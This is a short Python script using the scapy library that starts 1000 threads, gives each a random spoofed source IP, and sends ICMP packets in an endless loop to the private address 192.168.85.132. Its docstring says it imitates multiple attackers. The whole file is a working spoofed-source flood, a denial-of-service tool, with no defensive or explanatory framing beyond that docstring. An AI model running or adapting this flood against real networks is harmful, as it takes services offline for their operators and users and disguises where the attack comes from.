'''
Use multi threads to imitate multiple attackers
'''


from scapy.all import *
import threading

num = 1000 # the number of the thread
local_src_ip = threading.local()

def process_thread(src):
    local_src_ip.src_ip = src
    send_packet()

def send_packet():
    src_ip = local_src_ip.src_ip
    while True:
        send(IP(src = src_ip, dst='192.168.85.132',ttl=(1,100))/ICMP())

def main():
    threads=[]

    for i in range(num):
        a, b, c, d = random.randint(100, 255), random.randint(100, 255), random.randint(100, 255), \
                           random.randint(100, 255)
        src_ip = f'{a}.{b}.{c}.{d}'
        t = threading.Thread(target=process_thread, args=(src_ip,), name='Thread %d' %i)
        threads.append(t)

    for i in range(num):
        threads[i].start()

    for i in range(num):
        threads[i].join()

if __name__ == '__main__':
    main()
